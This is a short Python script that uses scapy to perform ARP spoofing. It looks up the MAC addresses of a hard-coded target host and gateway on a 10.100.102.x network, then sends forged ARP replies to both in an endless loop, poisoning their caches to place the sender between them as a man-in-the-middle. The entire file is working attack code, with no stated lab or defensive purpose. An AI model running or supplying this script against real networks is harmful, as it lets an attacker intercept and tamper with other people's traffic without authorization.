import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
    spoofed_arp_pocket = scapy.ARP(
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        op="is-at"
    )
    scapy.send(spoofed_arp_pocket, verbose=0)

def get_mac(target_ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=target_ip)
    reply, _ = scapy.srp(arp_request, timeout=3, verbose=0)
    if reply:
        return reply[0][1].src
    return None

def wait_for_mac(ip):
    mac = None
    while mac is None:
        mac = get_mac(ip)
        if not mac:
            print("Could not find MAC address for IP: {}".format(ip))
    return mac

gateway_ip = "10.100.102.1"
target_ip = "10.100.102.104"

target_mac = wait_for_mac(target_ip)
gateway_mac = wait_for_mac(gateway_ip)

print("target mac address is:{}".format(target_mac))
while True:
    spoof(target_ip=target_ip, target_mac=target_mac, spoof_ip=gateway_ip)
    spoof(target_ip=gateway_ip, target_mac=gateway_mac, spoof_ip=target_ip)
    print("activated spoofing")
